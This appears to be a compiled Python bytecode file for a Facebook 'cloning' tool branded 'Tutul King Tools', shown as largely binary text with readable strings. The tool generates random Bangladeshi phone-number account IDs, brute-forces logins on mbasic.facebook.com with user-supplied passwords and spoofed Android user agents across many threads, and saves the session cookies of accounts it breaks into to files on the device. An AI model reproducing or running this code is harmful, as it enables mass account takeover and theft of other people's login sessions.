�
    �;5d.  �                   �  � d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dl	Z	 e j
        d�  �         d dlmZ d dlmZ d dlZd dlmZ d dlmZ d dlmZ d dlmZ 	 d dlZd dlmZ d dlZd dlmZ n+# e$ r#  e j
        d	�  �          e j
        d
�  �         Y nw xY w G d� d�  �        ZdZdZdZdZdZ dZ!dZ"dZ#dZ$dZ%dZ&dZ'dZ(dZ)dZ*dZ+dZ,dZ-dZ. ej/        e'e(e)e+e-g�  �        Z0eeeee e!e"e#gZ1 ej/        e1�  �        Z2 ej3        �   �         Z3e3�4                    d�  �        Z5 ej3        �   �         Z6e6j7        Z8e6j9        Z:e6j;        Z< ej=        �   �         Z= e j
        d�  �         dZ>d a?g a@g aAd � ZBd d!lmCZD d d"l m
ZE  eF eD�   �         d#         �  �        ZGeGd$k    reGd$z
  ZHd%ZIneGZHd&ZI	  eJd'�  �         d(ZKd)ZLd)ZL eMeK�  �        eLv r e j
        d*�  �         n	 n#   eJd+�  �         Y nxY wd,� ZNg ZOg ZP eQd-�  �        D ]�ZRd.ZS ej/        g d/��  �        Z-d0ZT ej/        g d1��  �        ZU ejV        d2d3�  �        ZW ej/        g d1��  �        ZXd4ZY ejV        d5d6�  �        ZZd7Z[ ejV        d8d9�  �        Z\ ejV        d:d;�  �        Z(d<Z]eS� d=e-� d>eT� eU� eW� eX� d?eY� eZ� d@e[� d@e\� d@e(� d=e]� �Z^eP�_                    e^�  �         ��dA� Z`dB� Za e`�   �          dS )C�    Nzgit pull)�BeautifulSoup)�date)�datetime)�sleep)�ThreadPoolExecutor)�ConnectionErrorz9pip install mechanize requests futures bs4==2 > /dev/nullzpip install bs4c                   �   � e Zd Zd� ZdS )�jalanc                 �   � |dz   D ]S}t           j        �                    |�  �         t           j        �                    �   �          t	          j        d�  �         �Td S )N�
g;�O��n�?)�sys�stdout�write�flush�timer   )�self�z�es      �temp.py�__init__zjalan.__init__   s\   � ��T�� 	� 	�A��J���Q�����J�������J�u�����	� 	�    N)�__name__�
__module__�__qualname__r   � r   r   r
   r
      s#   � � � � � �� � � � r   r
   z[1;97mz[1;91mz[1;92mz[1;93mz[1;94mz[1;95mz[1;96mz[0mz[1;30mz[41m[1;97mz[mz[93mz[32mz[95mz[33mz[0;34mz%H:%Mz5espeak -a 300 " Welcome,   to,  Tutul,  King,  Tools"u�  [0;92m
[1;32m╔══════════════════════════════════════════════════════════╗[1;93m
[1;32m║	         [1;93m ─━<🌺Assalamu Alaikum🌺>━─[1;32m	           ║
[1;32m╔══════════════════════════════════════════════════════════╗
[1;32m║[0;92m:########:'##::::'##:'########:'##::::'##:'##:::::::
[1;32m║[0;97m... ##..:: ##:::: ##:... ##..:: ##:::: ##: ##:::::::
[1;32m║[0;91m::: ##:::: ##:::: ##:::: ##:::: ##:::: ##: ##:::::::
[1;32m║[0;94m::: ##:::: ##:::: ##:::: ##:::: ##:::: ##: ##:::::::
[1;32m║[0;93m::: ##:::: ##:::: ##:::: ##:::: ##:::: ##: ##:::::::
[1;32m║[0;95m::: ##:::: ##:::: ##:::: ##:::: ##:::: ##: ##:::::::
[1;32m║[38;5;208m::: ##::::. #######::::: ##::::. #######:: ########:
[1;32m╚══════════════════════════════════════════════════════════╝
[1;32m╔══════════════════════════════════╗╔══════════════════════╗
[1;32m║NOTE : [37;41mTHIS TOOLS IS FREE[0;m[1;32m         ║║        [1;91m___T_[1;32m         ║
[1;33m║══════════════════════════════════║║       [1;91m| o o |[1;32m        ║
[1;34m║AUTHOR    : Mr. Tutul             ║║       [1;91m|__-__|[1;32m        ║
[1;35m║══════════════════════════════════║║       [1;91m/| []|'[1;32m        ║
[1;36m║WHATSAPP  : 01608843956           ║║     [1;91m()/|___|\()[1;32m      ║
[1;37m║══════════════════════════════════║║        [1;91m|_|_|[1;32m         ║
[1;38m║GITHUB    : Tutul-King            ║║       [1;91m|_| |_|[1;32m        ║
[1;39m║══════════════════════════════════║║                      ║
[1;31m║SERVER    : DATA :      WORKING   ║╚══════════════════════╝
[1;32m║══════════════════════════════════════════════════════════╗
[1;33m║FACEBOOK LINK : [1;91hhttps://www.facebook.com/Tutul.King.Ok.Bro[1;32m║
[1;34m║══════════════════════════════════════════════════════════║
[1;35m║PAGE: [1;91https://www.facebook.com/Abal.Not.AlLow.Okay.BrotheR[1;32m ║
[1;36m╚══════════════════════════════════════════════════════════╝[1;37mc                  �V   � t          j        d�  �         t          t          �  �         d S )N�clear)�os�system�print�logor   r   r   r   r   _   s!   � ��I�g����	�$�K�K�K�K�Kr   )�	localtime)r   �   �   �PM�AMz(

[1;33mLoading asset files ... [0;97mg������@z5.2r   z*
[1;31mNo internet connection ... [0;97mc                 �   � g d�}|D ]J}t          d| z   |z   �  �        f t          j        �                    �   �          t	          j        d�  �         �Kd S )N)z.   z..  z... z.... ��   )r    r   r   r   r   r   )�text�titik�os      r   �dynamicr-   w   sa   � �*�*�*�E�� )� )���d�4�i��k������
������4�:�a�=�=�=�=�)� )r   i'  zMozilla/5.0 (Linux; U; Android)�3�4�5�6�7�8�9�10�11�12�13�14�15�16�17z en-us; GT-)�A�B�C�D�E�F�G�H�I�J�K�L�M�N�O�P�Q�R�S�T�U�V�W�X�Y�Zr)   i�  z.AppleWebKit/537.36 (KHTML, like Gecko) Chrome/�I   �d   �0ih  i$  �(   �   zMobile Safari/537.36� z; z) �.c                  ��  � g } g }t           j         t           j         t          j        d�  �         t	          t
          �  �         t	          dt          � dt          � dt          � dt          � ��  �         t	          d�  �         d}d}d	}d
}t          j	        |||g�  �        }t          j        d�  �         t	          t
          �  �         t          t          dt          � dt          � dt          � dt          � d�	�  �        �  �        }t          |�  �        D ]C}d�                    d� t          d�  �        D �   �         �  �        }	| �                    |	�  �         �Dt          j        d�  �         t	          t
          �  �         d}
g }t	          d�  �         t          |
�  �        D ]-}t          d|dz   � d��  �        }|�                    |�  �         �.t          d��  �        5 }t!          �   �          t#          t%          | �  �        �  �        }t'          d�  �         t'          dt          � dt          � dt          � �|z   �  �         t'          t          � dt          � dt          � d��  �         t'          dt          � dt          � d��  �         t'          dt          � dt          � d��  �         t'          dt          � dt          � d��  �         t'          d�  �         | D ]^}|dd �         g}||z   }|D ],}|�                    |�  �         |�                    |�  �         �-|�                    t*          |||�  �         �_	 d d d �  �         n# 1 swxY w Y   t	          dt          � d��  �         d S )Nr   z [�^z] Example>: z019,017,018,92302,92301,91778u    ══════════════════════════════════════════�0191�0192�0195�019z[0;97m[u�   ][0;92m EXAMPLE : [0;93m10000, [38;5;208m20000, [0;92m50000 ] 
[0;95m═════════════════════════════════════════ 
[0;97m[z#] [0;92mPUT CLONING LIMIT:[0;93m � c              3   �R   K  � | ]"}t          j        t          j        �  �        V � �#d S )N)�random�choice�string�digits)�.0�_s     r   �	<genexpr>zxxr.<locals>.<genexpr>�   s.   � � � �E�E�q�f�m�F�M�2�2�E�E�E�E�E�Er   �   r   z[*] Enter Password r)   z : �2   )�max_workersz;[1;97m====================================================�[z][38;5;208m YOUR TOTAL IDS: z:][0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTEDz][0;93m USE YOUR MOBILE DATA z)] [38;5;208mUse Flight Mode For Speed Upz!] [0;95mSuper Fast Speed Cloningr   )r   �getuid�geteuidr   r    r!   �xr�xrf   rg   �int�input�range�join�append�
ThreadPoolr   �str�lenr
   �submit�rcrack)�user�twf�rk1�rk2�rk3�rk4�code�limit�nmbr�nmp�passx�HamiiID�bilal�pww�manshera�tl�love�pwx�uid�Emans                       r   �xxrr�   �   s  � �	�D�	�C��I�I��J�J��I�g����	�$�K�K�K�	�
G�r�
G�
G�A�
G�
G�2�
G�
G�A�
G�
G�H�H�H�	�  L�  M�  M�  M�
�C�
�C�
�C�
�C��=�#�c�#��'�'�D��I�g����	�$�K�K�K���  A�B�  A�  A��  A�  A�  PR�  A�  A�  UV�  A�  A�  A�  B�  B�  C�  C�E��e��� � ���g�g�E�E�E�!�H�H�E�E�E�E�E�����C������I�g����	�$�K�K�K��E��G�	�"�I�I�I��u��� � ���6�%��'�6�6�6�7�7�����s�����	��	#�	#�	#� /�x�������T���^�^���N�O�O�O��>�"�>�>�q�>�>�"�>�>�r�A�B�B�B���Z�Z�R�Z�Z�!�Z�Z�Z�[�[�[��E�B�E�E��E�E�E�F�F�F��P�B�P�P��P�P�P�Q�Q�Q��H�B�H�H��H�H�H�I�I�I��N�O�O�O�� 	/� 	/�D�����8�*�C��t�)�C�� !� !���
�
�4� � � ��
�
�4� � � � ��O�O�F�3�s�2�.�.�.�.�	/�/� /� /� /� /� /� /� /� /� /� /���� /� /� /� /�" 
�  R�q�  R�  R�  R�  S�  S�  S�  S�  Ss   �"EM
�
M�Mc                 �h  � 	 |D �]}t          j        t          �  �        }t          j        �   �         }|�                    d�  �        j        }t          j        dt          |�  �        �  �        �
                    d�  �        t          j        dt          |�  �        �  �        �
                    d�  �        t          j        dt          |�  �        �  �        �
                    d�  �        t          j        dt          |�  �        �  �        �
                    d�  �        dd| |dd	�	}d
ddddddddddddd|d�}|�                    d||��  �        j        }	|j        �                    �   �         �                    �   �         }
d|
v r�d�                    d� |j        �                    �   �         �                    �   �         D �   �         �  �        }|dd�         }t#          d| z   d z   |z   d!z   |z   d"z   �  �         t%          j        d#�  �         t)          ||�  �         t+          d$d%�  �        �                    | d&z   |z   d'z   �  �         t.          �                    |�  �          n�d(|
v r�d�                    d)� |j        �                    �   �         �                    �   �         D �   �         �  �        }|d*d+�         }t%          j        d,�  �         t+          d-d%�  �        �                    | d&z   |z   d.z   �  �         t2          �                    |�  �          n��t4          dz  at6          j        �                    d/t:          � d0t<          � d1t:          � d2t<          � d3t:          � d4�t>          t4          |tA          t.          �  �        fz  �  �        f t6          j        �!                    �   �          d S #  Y d S xY w)5Nzhttps://mbasic.facebook.comzname="lsd" value="(.*?)"r)   zname="jazoest" value="(.*?)"zname="m_ts" value="(.*?)"zname="li" value="(.*?)"rY   zLog In)	�lsd�jazoest�m_ts�li�
try_number�unrecognized_tries�email�pass�loginzmbasic.facebook.com�GET�httpsz�text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9zen-GB,en-US;q=0.9,en;q=0.8z	max-age=0z("Chromium";v="107", "Not=A?Brand";v="24"z?1z	"Android"�document�navigate�none�1)�	authority�method�scheme�acceptzaccept-languagezcache-controlz	sec-ch-uazsec-ch-ua-mobilezsec-ch-ua-platformzsec-fetch-destzsec-fetch-modezsec-fetch-sitezsec-fetch-userzupgrade-insecure-requestsz
user-agentzUhttps://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100)�data�headers�c_user�;c                 �$   � g | ]\  }}|d z   |z   ��S ��=r   �rj   �key�values      r   �
<listcomp>zrcrack.<locals>.<listcomp>�   �$   � �a�a�a���U�s�3�w�u�}�a�a�ar   rm   �   u   [1;32m[Tutul-OK💚] [1;32mu   [1;32m • [1;32mu'     
[‎‎🌺][0;93m COOKIE = [1;32mz    [0;97mz espeak -a 300 " Tutul,  Ok,  id"z/sdcard/Tutul-OK.txt�az | r   �
checkpointc                 �$   � g | ]\  }}|d z   |z   ��S r�   r   r�   s      r   r�   zrcrack.<locals>.<listcomp>�   r�   r   �   �'   z espeak -a 300 " Tutul,  Cp,  id"u   /sdcard/Tutul-CP😁😁.txtz 
z%srp   �Tutulz][%s\%s][OK:z%s�])"rf   rg   �ugen�requests�Session�getr*   �re�searchr{   �group�post�cookies�get_dict�keysrx   �itemsr    r   r   �cek_apk�openr   �oksry   �cps�loopr   r   rt   rs   rD   r|   r   )r�   r�   r�   �ps�pro�session�free_fb�log_data�header_freefb�lo�log_cookies�coki�cids                r   r~   r~   �   s�  � �7�� 1	� 1	�B��-��%�%�C��&�(�(�G��k�k�"?�@�@�E�G��i� :�C��L�L�I�I�O�O�PQ�R�R��i� >��G���M�M�S�S�TU�V�V��9�8�#�g�,�,�G�G�M�M�a�P�P���4�c�'�l�l�C�C�I�I�!�L�L��!$����	� 	�H� +@��� `�;�(�C� $�"-�(�(�$�"�),��� �M� ���u�  |D�  MZ��  [�  [�  `�B���0�0�2�2�7�7�9�9�K��;�&�&��X�X�a�a�g�o�>V�>V�>X�>X�>^�>^�>`�>`�a�a�a�b�b���1�R�4�j���?��C�D_�_�ac�c�  iY�  Y�  Z^�  ^�  as�  s�  t�  t�  t��	�<�=�=�=����%�%�%��+�S�1�1�7�7��U��2��d�9J�K�K�K��
�
�3��������,�,��X�X�a�a�g�o�>V�>V�>X�>X�>^�>^�>`�>`�a�a�a�b�b���2�b�5�k���	�<�=�=�=��3�S�9�9�?�?��U��2��e�AS�T�T�T��
�
�3��������a����
���H�!�H�H�b�H�H�q�H�H�b�H�H�A�H�H�H�!�D�QS�TW�X[�T\�T\�I]�]�^�^�_�_��
���������������s   �N(N, �,N1)br   r   r   �jsonrf   r�   rh   �platform�base64�uuidr   �bs4r   �sopr�   �ressr   r   r   �waktu�concurrent.futuresr   rz   �	mechanize�requests.exceptionsr   �ModuleNotFoundErrorr
   rL   rI   rD   rG   r>   rQ   rK   rJ   rV   �sirrt   �m�krs   �hh�u�kk�b�prg   �asu�my_color�warna�now�strftime�	dt_string�current�year�ta�month�bu�day�ha�todayr!   r�   r�   r�   r   r"   �lt�cmdru   �ltxr�   �tagr    �v�updater{   r-   �ugen2r�   rw   �xd�aa�c�d�	randranger   �f�g�h�i�j�l�uaku2ry   r�   r~   r   r   r   �<module>r     sV  �� >� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� =� 	��	�*� � � � $� $� $� $� $� $� � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � � �!��O�O�O�C�C�C�C�C�C�����3�3�3�3�3�3�3��� !� !� !��B�I�I�J�J�J��B�I�� � � � � �!����� � � � � � � � ���������������������������������������f�m�Q�q��A�a�L�!�!���A�q�!�Q��1�a������h�����h�l�n�n���L�L��!�!�	�
�(�,�.�.���\���]���[����
���� 	��	�
A� B� B� B�L��6 	������� � � !�  �  �  �  �  � � � � � � �	�c�"�"�$�$�q�'�l�l����8�8��B��A�
�C�C��A�
�C�B�	�E�
<�=�=�=��A��F��F�
�s�1�v�v������	�'�����	��� A�u�u�@�A�A�A�A�A����)� )� )� 	����
�%��,�,� � �B�'�B��f�m�Y�Y�Y�Z�Z�A��A��f�m�  V�  V�  V�  W�  W�A��f��q�#���A��f�m�  V�  V�  V�  W�  W�A�6�A��f��r�#���A�	�A��f��t�D�!�!�A��f��r�#���A��A��<�<�1�<�<��<�1�<�a�<��<�<�a�<��<�<�Q�<�<��<�<�Q�<�<��<�<�E��K�K������-S� -S� -S�\=� =� =�~ ������s   �"A7 �7%B�B�.0G �G.